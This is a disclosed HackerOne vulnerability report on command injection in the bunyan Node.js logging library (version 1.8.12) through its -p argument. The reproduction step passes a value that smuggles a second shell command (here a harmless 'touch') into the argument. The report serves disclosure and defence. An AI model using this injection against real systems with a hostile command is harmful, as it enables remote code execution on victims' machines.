# bunyan - RCE via insecure command formatting

## Report Details
- **Report ID**: 902739
- **URL**: https://hackerone.com/reports/902739
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-06-19T10:29:37.243Z
- **Disclosed**: 2020-06-27T01:53:03.703Z

## Reporter
- **Username**: ahihi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report RCE in bunyan
It allows arbitrary commands remotely inside the victim's PC

# Module

**module name:** bunyan
**version:** 1.8.12
**npm page:** `https://www.npmjs.com/package/bunyan`

## Module Description

> Bunyan is a simple and fast JSON logging library for node.js services:

## Module Stats

[920,196] weekly downloads

# Vulnerability

## Vulnerability Description

> The issue occurs because a user input is formatted inside a command that will be executed without any check. https://github.com/trentm/node-bunyan/blob/master/bin/bunyan#L1224

## Steps To Reproduce:

> Run the following command
npm install bunyan
./node_modules/bunyan/bin/bunyan -p "S'11;touch hacked ;'"
> Recheck the files: now hacked has been created
## Patch

> Check input before command

## Supporting Material/References:

> State all technical information about the stack where the vulnerability was found

- [OPERATING SYSTEM VERSION]: Ubuntu 18.04
- [NODEJS VERSION]: v8.10.0
- [NPM VERSION]: 3.5.2

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: [Y/N] N 
- I opened an issue in the related repository: [Y/N] N

## Impact

RCE on bunyan.

## Attachments
- Screen_Shot_2020-06-19_at_16.24.05.png
